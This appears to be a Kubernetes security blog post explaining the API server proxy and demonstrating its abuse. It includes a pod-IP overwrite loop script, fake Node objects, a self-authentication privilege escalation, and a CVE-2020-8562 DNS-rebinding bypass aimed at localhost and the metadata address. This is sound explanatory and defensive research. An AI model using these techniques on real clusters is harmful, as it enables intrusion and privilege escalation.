@@ -1,0 +1,453 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="utf-8">
+	<title>Exploring the Kubernetes API Server Proxy</title>
+	
+	<meta name="author" content="raesene">
+
+	<!-- Enable responsive viewport -->
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+	<!-- Le HTML5 shim, for IE6-8 support of HTML elements -->
+	<!--[if lt IE 9]>
+	<script src="http://html5shim.googlecode.com/svn/trunk/html5.js"></script>
+	<![endif]-->
+
+	<!-- Le styles -->
+	<link href="https://raesene.github.io/assets/resources/bootstrap/css/bootstrap.min.css" rel="stylesheet">
+	<link href="https://raesene.github.io/assets/resources/font-awesome/css/font-awesome.min.css" rel="stylesheet">
+	<link href="https://raesene.github.io/assets/resources/syntax/syntax.css" rel="stylesheet">
+	<link href="https://raesene.github.io/assets/css/style.css" rel="stylesheet">
+
+	<!-- Le fav and touch icons -->
+	<!-- Update these with your own images
+	<link rel="shortcut icon" href="images/favicon.ico">
+	<link rel="apple-touch-icon" href="images/apple-touch-icon.png">
+	<link rel="apple-touch-icon" sizes="72x72" href="images/apple-touch-icon-72x72.png">
+	<link rel="apple-touch-icon" sizes="114x114" href="images/apple-touch-icon-114x114.png">
+	-->
+
+	<link rel="alternate" type="application/rss+xml" title="" href="https://raesene.github.io/feed.xml">
+</head>
+
+<body>
+	<nav class="navbar navbar-default visible-xs" role="navigation">
+		<!-- Brand and toggle get grouped for better mobile display -->
+		<div class="navbar-header">
+			<button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1">
+				<span class="sr-only">Toggle navigation</span>
+				<span class="icon-bar"></span>
+				<span class="icon-bar"></span>
+				<span class="icon-bar"></span>
+			</button>
+			
+			<a type="button" class="navbar-toggle nav-link" href="https://github.com/raesene">
+				<i class="fa fa-github"></i>
+			</a>
+			
+			
+			
+			<a type="button" class="navbar-toggle nav-link" href="https://bsky.app/profile/mccune.org.uk">
+				<i class="fa fa-cloud"></i>
+			</a>	
+			
+			
+			<a type="button" class="navbar-toggle nav-link" href="mailto:raesene@gmail.com">
+				<i class="fa fa-envelope"></i>
+			</a>
+			
+			<a class="navbar-brand" href="https://raesene.github.io/">
+				<img src="https://www.gravatar.com/avatar/8c189c784a607c4b5d52b0c7ee69b036?s=35" class="img-circle" />
+				Raesene's Ramblings
+			</a>
+		</div>
+
+		<!-- Collect the nav links, forms, and other content for toggling -->
+		<div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
+			<ul class="nav navbar-nav">
+				<li class="active"><a href="https://raesene.github.io/">Home</a></li>
+				<li><a href="https://raesene.github.io/categories/index.html">Categories</a></li>
+				<li><a href="https://raesene.github.io/tags/index.html">Tags</a></li>
+			</ul>
+		</div><!-- /.navbar-collapse -->
+	</nav>
+
+	<!-- nav-menu-dropdown -->
+	<div class="btn-group hidden-xs" id="nav-menu">
+		<button type="button" class="btn btn-default dropdown-toggle" data-toggle="dropdown">
+			<i class="fa fa-bars"></i>
+		</button>
+		<ul class="dropdown-menu" role="menu">
+			<li><a href="https://raesene.github.io/"><i class="fa fa-home"></i>Home</a></li>
+			<li><a href="https://raesene.github.io/categories/index.html"><i class="fa fa-folder"></i>Categories</a></li>
+			<li><a href="https://raesene.github.io/tags/index.html"><i class="fa fa-tags"></i>Tags</a></li>
+			<li class="divider"></li>
+			<li><a href="#"><i class="fa fa-arrow-up"></i>Top of Page</a></li>
+		</ul>
+	</div>
+
+	<div class="col-sm-3 sidebar hidden-xs">
+		<!-- sidebar.html -->
+<header class="sidebar-header" role="banner">
+	<a href="https://raesene.github.io/">
+		<img src="https://www.gravatar.com/avatar/8c189c784a607c4b5d52b0c7ee69b036?s=150" class="img-circle" />
+	</a>
+	<h3 class="title">
+        <a href="https://raesene.github.io/">Raesene's Ramblings</a>
+    </h3>
+</header>
+
+
+<div id="bio" class="text-center">
+	Security Geek, Kubernetes, Docker, Ruby, Hillwalking
+</div>
+
+
+<div id="contact-list" class="text-center">
+	<ul class="list-unstyled list-inline">
+		
+		<li>
+			<a class="btn btn-default btn-sm" href="https://github.com/raesene">
+				<i class="fa fa-github-alt fa-lg"></i>
+			</a>
+		</li>
+		
+		
+		<li>
+			<a class="btn btn-default btn-sm" href="https://bsky.app/profile/mccune.org.uk">
+				<i class="fa fa-cloud fa-lg"></i>
+			</a>
+		</li>
+		
+		
+		<li>
+			<a class="btn btn-default btn-sm" href="mailto:raesene@gmail.com">
+				<i class="fa fa-envelope fa-lg"></i>
+			</a>
+		</li>
+		
+	</ul>
+	<ul id="contact-list-secondary" class="list-unstyled list-inline">
+		
+		
+		<li>
+			<a class="btn btn-default btn-sm" href="https://linkedin.com/in/rorym">
+				<i class="fa fa-linkedin fa-lg"></i>
+			</a>
+		</li>
+		
+		<li>
+			<a class="btn btn-default btn-sm" href="https://raesene.github.io/feed.xml">
+				<i class="fa fa-rss fa-lg"></i>
+			</a>
+		</li>
+	</ul>
+</div>
+<!-- sidebar.html end -->
+
+	</div>
+
+	<div class="col-sm-9 col-sm-offset-3">
+		<div class="page-header">
+  <h1>Exploring the Kubernetes API Server Proxy </h1>
+</div>
+	
+<article>
+
+	<div class="col-sm-10">
+	 <span class="post-date">
+	   
+	   January 
+	   18th,
+	   
+	   2025
+	 </span>
+	  <div class="article_body">
+	  <p>For my first post of the year I thought it’d be interesting to look at a lesser known feature of the Kubernetes API server which has some interesting security implications.</p>
+
+<p>The Kubernetes API server can act as an HTTP proxy server, allowing users with the right access to get to applications they might otherwise not be able to reach. This is one of a number of proxies in the Kubernetes world (detailed <a href="https://kubernetes.io/docs/concepts/cluster-administration/proxies/">here</a>) which serve different purposes. The proxy can be used to access pods, services, and nodes in the cluster, we’ll focus on pods and nodes for this post.</p>
+
+<h2 id="how-does-it-work">How does it work?</h2>
+
+<p>Let’s demonstrate how this works with a <a href="https://kind.sigs.k8s.io/">KinD</a> cluster and some pods. With a standard kind cluster spun up using <code class="language-plaintext highlighter-rouge">kind create cluster</code> we can start an echo server so it’ll show us what we’re sending</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kubectl run echoserver <span class="nt">--image</span> gcr.io/google_containers/echoserver:1.10
+</code></pre></div></div>
+
+<p>Next (just to make things a bit more complex) we’ll start the <a href="https://kubernetes.io/docs/tasks/access-application-cluster/access-cluster/#directly-accessing-the-rest-api">kubectl proxy</a> on our client to let us send curl requests to the API server more easily</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kubectl proxy
+</code></pre></div></div>
+
+<p>With that all in place we can use a <code class="language-plaintext highlighter-rouge">curl</code> request from our client to access the echoserver pod via the API server proxy</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl http://127.0.0.1:8001/api/v1/namespaces/default/pods/echoserver:8080/proxy/
+</code></pre></div></div>
+
+<p>And you should get a response that looks a bit like this</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Request Information:
+        client_address=10.244.0.1
+        method=GET
+        real path=/
+        query=
+        request_version=1.1
+        request_scheme=http
+        request_uri=http://127.0.0.1:8080/
+
+Request Headers:
+        accept=*/*
+        accept-encoding=gzip
+        host=127.0.0.1:45745
+        user-agent=curl/8.5.0
+        x-forwarded-for=127.0.0.1, 172.18.0.1
+        x-forwarded-uri=/api/v1/namespaces/default/pods/echoserver:8080/proxy/
+</code></pre></div></div>
+
+<p>Looking at the response from the echo server we can see some interesting items. The <code class="language-plaintext highlighter-rouge">client_address</code> is the API servers address on the pod network, and we can also see the <code class="language-plaintext highlighter-rouge">x-forwarded-for</code> and <code class="language-plaintext highlighter-rouge">x-forwarded-uri</code> headers are set too.</p>
+
+<p>Graphically the set of connections look a bit like this</p>
+
+<p><img src="https://raesene.github.io/assets/media/kube-api-proxy.png" alt="API Server Proxy" /></p>
+
+<p>In terms of how this feature works, one interesting point to note here is that it’s possible to specify the port that we’re using, so the API server proxy can be used to get to any port.</p>
+
+<p>We can also put in anything that works in a curl request and it will be relayed onwards to the proxy targets, so POST requests, headers with tokens or anything else that’s valid in curl, which makes this pretty powerful.</p>
+
+<p>It’s not just pods that we can proxy to, we can also get to any service running on a node (with an exception we’ll mention in a bit). So for example with our kind cluster setup, we can issue a curl command like</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl http://127.0.0.1:8001/api/v1/nodes/http:kind-control-plane:10256/proxy/healthz
+</code></pre></div></div>
+
+<p>and we get back the kube-proxy’s healthz endpoint information</p>
+
+<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="nl">"lastUpdated"</span><span class="p">:</span><span class="w"> </span><span class="s2">"2025-01-18 07:58:53.413049689 +0000 UTC m=+930.365308647"</span><span class="p">,</span><span class="nl">"currentTime"</span><span class="p">:</span><span class="w"> </span><span class="s2">"2025-01-18 07:58:53.413049689 +0000 UTC m=+930.365308647"</span><span class="p">,</span><span class="w"> </span><span class="nl">"nodeEligible"</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
+
+<h2 id="security-controls">Security Controls</h2>
+
+<p>Obviously this is a fairly powerful feature and not something you’d want to give to just anyone, so what rights do you need and what restrictions are there on its use?</p>
+
+<p>The user making use of the proxy requires rights to the <code class="language-plaintext highlighter-rouge">proxy</code> sub-resource of <code class="language-plaintext highlighter-rouge">pods</code> or <code class="language-plaintext highlighter-rouge">nodes</code> (N.B. Providing <code class="language-plaintext highlighter-rouge">node/proxy</code> rights also allows use of the Kubelet APIs more dangerous features).</p>
+
+<p>Additionally there is a check in the API server source code which looks to stop users of this feature from reaching localhost or link-local (e.g. <code class="language-plaintext highlighter-rouge">169.254.169.254</code>) addresses. The function <a href="https://github.com/kubernetes/kubernetes/blob/master/pkg/registry/core/node/strategy.go#L272"><code class="language-plaintext highlighter-rouge">isProxyableHost</code></a> uses the golang function <code class="language-plaintext highlighter-rouge">isGlobalUnicast</code> to check if it’s ok to proxy the requests.</p>
+
+<h2 id="bypasses-and-limitations">Bypasses and limitations</h2>
+
+<p>Now we’ve described a bit about how this feature is used and secured, let’s get on to the fun part, how can it be (mis)used :)</p>
+
+<p>Obviously a server service that lets us proxy requests, is effectively SSRF by design, so it seems likely that there’s are some interesting ways we can use it.</p>
+
+<h3 id="proxying-to-addresses-outside-the-cluster">Proxying to addresses outside the cluster</h3>
+
+<p>One thing that might be handy if you’re a pentester or perhaps CTF player is being able to use the API server’s network position to get access to other hosts on restricted networks. To do that we’d need to be able to tell the API server proxy to direct traffic to arbitrary IP addresses rather than just pods and nodes inside the cluster.</p>
+
+<p>For this we’ll go to a Kinvolk <a href="https://kinvolk.io/blog/2019/02/abusing-kubernetes-apiserver-proxying">blog post from 2019</a>, as this technique works fine in 2025!</p>
+
+<p>Essentially, if you own a pod resource you can overwrite the IP address that it has in its status and then proxy to that IP address. It’s a little tricky as the Kubernetes cluster will spot this change as a mistake and will change it back to the valid IP address, so you have to loop the requests to keep it set to the value you want.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>
+
+<span class="nb">set</span> <span class="nt">-euo</span> pipefail
+
+<span class="nb">readonly </span><span class="nv">PORT</span><span class="o">=</span>8001
+<span class="nb">readonly </span><span class="nv">POD</span><span class="o">=</span>echoserver
+<span class="nb">readonly </span><span class="nv">TARGETIP</span><span class="o">=</span>1.1.1.1
+
+<span class="k">while </span><span class="nb">true</span><span class="p">;</span> <span class="k">do
+  </span>curl <span class="nt">-v</span> <span class="nt">-H</span> <span class="s1">'Content-Type: application/json'</span> <span class="se">\</span>
+    <span class="s2">"http://localhost:</span><span class="k">${</span><span class="nv">PORT</span><span class="k">}</span><span class="s2">/api/v1/namespaces/default/pods/</span><span class="k">${</span><span class="nv">POD</span><span class="k">}</span><span class="s2">/status"</span> <span class="o">&gt;</span><span class="s2">"</span><span class="k">${</span><span class="nv">POD</span><span class="k">}</span><span class="s2">-orig.json"</span>
+
+  <span class="nb">cat</span> <span class="nv">$POD</span><span class="nt">-orig</span>.json |
+    <span class="nb">sed</span> <span class="s1">'s/"podIP": ".*",/"podIP": "'</span><span class="k">${</span><span class="nv">TARGETIP</span><span class="k">}</span><span class="s1">'",/g'</span> <span class="se">\</span>
+      <span class="o">&gt;</span><span class="s2">"</span><span class="k">${</span><span class="nv">POD</span><span class="k">}</span><span class="s2">-patched.json"</span>
+
+  curl <span class="nt">-v</span> <span class="nt">-H</span> <span class="s1">'Content-Type:application/merge-patch+json'</span> <span class="se">\</span>
+    <span class="nt">-X</span> PATCH <span class="nt">-d</span> <span class="s2">"@</span><span class="k">${</span><span class="nv">POD</span><span class="k">}</span><span class="s2">-patched.json"</span> <span class="se">\</span>
+    <span class="s2">"http://localhost:</span><span class="k">${</span><span class="nv">PORT</span><span class="k">}</span><span class="s2">/api/v1/namespaces/default/pods/</span><span class="k">${</span><span class="nv">POD</span><span class="k">}</span><span class="s2">/status"</span>
+
+  <span class="nb">rm</span> <span class="nt">-f</span> <span class="s2">"</span><span class="k">${</span><span class="nv">POD</span><span class="k">}</span><span class="s2">-orig.json"</span> <span class="s2">"</span><span class="k">${</span><span class="nv">POD</span><span class="k">}</span><span class="s2">-patched.json"</span>
+<span class="k">done</span>
+</code></pre></div></div>
+
+<p>With this script looping, you can make a request like</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl http://127.0.0.1:8001/api/v1/namespaces/default/pods/echoserver/proxy/
+</code></pre></div></div>
+
+<p>and you’ll get the response from the Target IP (in this case 1.1.1.1)</p>
+
+<h3 id="fake-node-objects">Fake Node objects</h3>
+
+<p>Another route to achieving this goal can be to create fake node objects in the cluster (assuming you’ve got the rights to do that). How well this one works depends a bit on the distribution as some will quickly clean up any fake nodes that are created, but it works fine in vanilla Kubernetes.</p>
+
+<p>What’s handy here is that we can use hostnames instead of just IP addresses so something like</p>
+
+<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="na">kind</span><span class="pi">:</span> <span class="s">Node</span>
+<span class="na">apiVersion</span><span class="pi">:</span> <span class="s">v1</span>
+<span class="na">metadata</span><span class="pi">:</span>
+  <span class="na">name</span><span class="pi">:</span> <span class="s">fakegoogle</span>
+<span class="na">status</span><span class="pi">:</span>
+  <span class="na">addresses</span><span class="pi">:</span>
+  <span class="pi">-</span> <span class="na">address</span><span class="pi">:</span> <span class="s">www.google.com</span>
+    <span class="na">type</span><span class="pi">:</span> <span class="s">Hostname</span>
+</code></pre></div></div>
+
+<p>Will then allow us to issue a curl request like</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl http://127.0.0.1:8001/api/v1/nodes/http:fakegoogle:80/proxy/
+</code></pre></div></div>
+
+<p>and get a response from <code class="language-plaintext highlighter-rouge">www.google.com</code>.</p>
+
+<h3 id="getting-the-api-server-to-authenticate-to-itself">Getting the API Server to authenticate to itself</h3>
+
+<p>An interesting variation on this idea was noted in the Kubernetes 1.24 Security audit and is currently still an <a href="https://github.com/kubernetes/kubernetes/issues/119270">open issue</a> so exploitable. This builds on the idea of a fake node by adding additional information to say that the kubelet port on this node is the same as the API server’s port. This causes the API server to authenticate to itself and allows someone with create node and node proxy rights to escalate to full cluster admin.</p>
+
+<p>A YAML like this</p>
+
+<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="na">kind</span><span class="pi">:</span> <span class="s">Node</span>
+<span class="na">apiVersion</span><span class="pi">:</span> <span class="s">v1</span>
+<span class="na">metadata</span><span class="pi">:</span>
+  <span class="na">name</span><span class="pi">:</span> <span class="s">kindserver</span>
+<span class="na">status</span><span class="pi">:</span>
+  <span class="na">addresses</span><span class="pi">:</span>
+  <span class="pi">-</span> <span class="na">address</span><span class="pi">:</span> <span class="s">172.20.0.3</span>
+    <span class="na">type</span><span class="pi">:</span> <span class="s">ExternalIP</span>
+  <span class="na">daemonEndpoints</span><span class="pi">:</span>
+    <span class="na">kubeletEndpoint</span><span class="pi">:</span>
+      <span class="na">Port</span><span class="pi">:</span> <span class="m">6443</span>
+</code></pre></div></div>
+
+<p>can be applied and then curl commands like the one below get access to the API server</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl http://127.0.0.1:8001/api/v1/nodes/https:kindserver:6443/proxy/
+</code></pre></div></div>
+
+<h3 id="cve-2020-8562---bypassing-the-blocklist">CVE-2020-8562 - Bypassing the blocklist</h3>
+
+<p>Another point to note about the API server proxy is that it might be possible to bypass the blocklist that’s in place via a known, but unpatchable, CVE (There’s a great blog with details on the original CVE from the reporter <a href="https://business.blogthinkbig.com/kubernetes-vulnerability-discovered-allows-access-restricted-networks-cve-2020-8562/">here</a>).</p>
+
+<p>There is a TOCTOU vulnerability in the API servers blocklist checking that means, if you can make requests to an address you control via the API server proxy, you might be able to get the request to go to IP addresses like localhost or the cloud metadata service addresses like <code class="language-plaintext highlighter-rouge">169.254.169.254</code>.</p>
+
+<p><img src="https://raesene.github.io/assets/media/CVE-2020-8562.png" alt="CVE-2020-8562" /></p>
+
+<p>Exploiting this one takes a couple of steps. Firstly we can use a fake node object, as described in the previous section, then we’ll need a DNS service that resolves to different IP addresses alternately.</p>
+
+<p>Fortunately for us, there’s an existing service we can use for the rebinding, https://lock.cmpxchg8b.com/rebinder.html.</p>
+
+<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="na">kind</span><span class="pi">:</span> <span class="s">Node</span>
+<span class="na">apiVersion</span><span class="pi">:</span> <span class="s">v1</span>
+<span class="na">metadata</span><span class="pi">:</span>
+  <span class="na">name</span><span class="pi">:</span> <span class="s">rebinder</span>
+<span class="na">status</span><span class="pi">:</span>
+  <span class="na">addresses</span><span class="pi">:</span>
+  <span class="pi">-</span> <span class="na">address</span><span class="pi">:</span> <span class="s">2d21209c.7f000001.rbndr.us</span> 
+    <span class="na">type</span><span class="pi">:</span> <span class="s">Hostname</span>
+</code></pre></div></div>
+
+<p>With that created we can use the URL below to try and access the configuration of the kube-proxy component which is only listening on localhost.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl http://127.0.0.1:8001/api/v1/nodes/http:rebinder:10249/proxy/configz
+</code></pre></div></div>
+
+<p>As this is a TOCTOU it can take quite a few attempts to get a response. You should see 3 possibilities. firstly a <code class="language-plaintext highlighter-rouge">400</code> response which happens when the blocklist check fails. Secondly a <code class="language-plaintext highlighter-rouge">503</code> response where it goes to the external address (in this case the IP address for <code class="language-plaintext highlighter-rouge">scanme.nmap.org</code>) and doesn’t get a response on that URL, and lastly when the TOCTOU is successful you’ll get the response back from the proxy service. I generally have found that &lt; 30 requests is needed for a “hit” using this technique.</p>
+
+<p>One place where this particular technique is interesting is obviously cloud hosted Kubernetes clusters, and in particular managed providers where they probably don’t want cluster operators requesting localhost interfaces on machines they control :)</p>
+
+<p>To mitigate this many of the ones I’ve looked at use <a href="https://kubernetes.io/docs/tasks/extend-kubernetes/setup-konnectivity/">Konnectivity</a> which is <em>yet another</em> proxy and can be configured to ensure that any requests that come in from user controlled addresses are routed back to the node network and away from the control plane network.</p>
+
+<h2 id="conclusion">Conclusion</h2>
+
+<p>The Kubernetes API server proxy is a handy feature for a number of reasons but obviously making any service a proxy is a tricky proposition from a security standpoint.</p>
+
+<p>If you’re a cluster operator it’s important to be very careful with who you provide proxy rights to, and if you’re considering creating a managed Kubernetes service where you don’t want cluster owners to have access to the control plane, you’re going to need to be very careful with network firewalling and ensuring that the proxy doesn’t let them get to areas that should be restricted!</p>
+
+	  </div>
+
+		
+		<ul class="tag_box list-unstyled list-inline">
+		  <li><i class="fa fa-folder-open"></i></li>
+		  
+		  
+			 
+				<li><a href="https://raesene.github.io/categories/index.html#Kubernetes-ref">
+					Kubernetes <span>(62)</span>
+					
+				</a></li>
+			
+		  
+		</ul>
+		  
+
+		  
+
+		<hr>
+
+		<div>
+      <section class="share col-sm-6">
+        <h4 class="section-title">Share Post</h4>
+        <a class="btn btn-default btn-sm twitter" href="https://twitter.com/share?text=Exploring the Kubernetes API Server Proxy"
+           onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+          <i class="fa fa-twitter fa-lg"></i>
+          Twitter
+        </a>
+        <a class="btn btn-default btn-sm facebook" href="https://www.facebook.com/sharer/sharer.php"
+           onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
+          <i class="fa fa-facebook fa-lg"></i>
+          Facebook
+        </a>
+        <a class="btn btn-default btn-sm gplus"
+           onclick="window.open('https://plus.google.com/share?url='+window.location.href, 'google-plus-share', 'width=490,height=530');return false;">
+          <i class="fa fa-google-plus fa-lg"></i>
+          Google+
+        </a>
+      </section>
+
+      <section class="col-sm-6 author">
+        <img src="https://www.gravatar.com/avatar/8c189c784a607c4b5d52b0c7ee69b036" class="img-rounded author-image" />
+        <h4 class="section-title author-name">raesene</h4>
+        <p class="author-bio">Security Geek, Kubernetes, Docker, Ruby, Hillwalking</p>
+      </section>
+    </div>
+
+    <div class="clearfix"></div>
+
+		<ul class="pager">
+		  
+		  <li class="previous"><a href="https://raesene.github.io/blog/2024/11/11/When-Is-Read-Only-Not-Read-Only/" title="When is read-only not read-only?">&larr; Previous</a></li>
+		  
+		  
+			<li class="next disabled"><a>Next &rarr;</a>
+		  
+		</ul>
+
+		<hr>
+	</div>
+	
+	<div class="col-sm-2 sidebar-2">
+	
+	</div>
+</article>
+<div class="clearfix"></div>
+
+
+
+
+
+		<footer>
+			<hr/>
+			<p>
+				&copy; 2025 raesene with Jekyll. Theme: <a href="https://github.com/dbtek/dbyll">dbyll</a> by dbtek.
+			</p>
+		</footer>
+	</div>
+
+	<script type="text/javascript" src="https://raesene.github.io/assets/resources/jquery/jquery.min.js"></script>
+	<script type="text/javascript" src="https://raesene.github.io/assets/resources/bootstrap/js/bootstrap.min.js"></script>
+	<script type="text/javascript" src="https://raesene.github.io/assets/js/app.js"></script>
+</body>
+</html>
+
+
